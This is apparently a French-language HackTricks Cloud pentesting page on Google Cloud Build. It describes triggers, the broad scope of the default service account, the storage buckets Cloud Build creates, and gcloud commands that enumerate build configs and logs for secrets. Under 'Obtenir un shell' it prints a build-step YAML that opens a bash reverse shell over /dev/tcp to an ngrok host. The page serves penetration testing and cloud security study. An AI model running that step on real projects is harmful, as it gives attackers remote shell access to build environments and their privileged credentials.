# GCP - Cloud Build

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Google Cloud Build est une plateforme de CI/CD g√©r√©e qui **automatise la construction de logiciels** et les processus de publication, s'int√©grant aux **d√©p√¥ts de code source** et prenant en charge un large √©ventail de langages de programmation. Il **permet aux d√©veloppeurs de construire, tester et d√©ployer du code automatiquement** tout en offrant la flexibilit√© de personnaliser les √©tapes de construction et les flux de travail.

Chaque d√©clencheur Cloud Build est **li√© √† un r√©f√©rentiel Cloud ou directement connect√© √† un r√©f√©rentiel externe** (Github, Bitbucket ou Gitlab).

Il est possible de configurer un Cloud Build pour **exiger des approbations pour les ex√©cutions de construction** (d√©sactiv√© par d√©faut).

Le **compte de service a la port√©e `cloud-platform`**, il peut donc **utiliser tous les privil√®ges**. Si **aucun compte de service n'est sp√©cifi√©** (comme lors de la soumission), le **compte de service par d√©faut** `<proj-number>@cloudbuild.gserviceaccount.com` sera **utilis√©**.

{% hint style="success" %}
Je n'ai pas pu voir de moyen de voler le jeton Github/Bitbucket d'ici ou des r√©f√©rentiels Cloud car lorsque le r√©f√©rentiel est t√©l√©charg√©, il est acc√©d√© via une URL [https://source.cloud.google.com/](https://source.cloud.google.com/) et Github n'est pas accessible par le client.
{% endhint %}

### Stockage

Parfois, Cloud Build **g√©n√©rera un nouveau stockage pour stocker les fichiers pour le d√©clencheur**. Cela se produit par exemple dans l'exemple que GCP offre avec :

```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
  cd cloud-console-sample-build && \
  gcloud builds submit --config cloudbuild.yaml --region=global
```

Un bucket de stockage appel√© [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) est cr√©√© pour stocker un fichier `.tgz` avec les fichiers √† utiliser.

### Obtenir un shell

```yaml
steps:
  - name: bash
    script: |
      #!/usr/bin/env bash
      bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
  logging: CLOUD_LOGGING_ONLY
```

### √ânum√©ration

Vous pouvez trouver des **informations sensibles dans les configurations de construction et les journaux**.

```bash
gcloud builds list
gcloud builds describe <build-uuid> # Obtenir m√™me le yaml de construction s'il est d√©fini l√†-bas
gcloud builds log <build-uuid> # Obtenir les journaux de construction
```

## √âl√©vation de privil√®ges

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>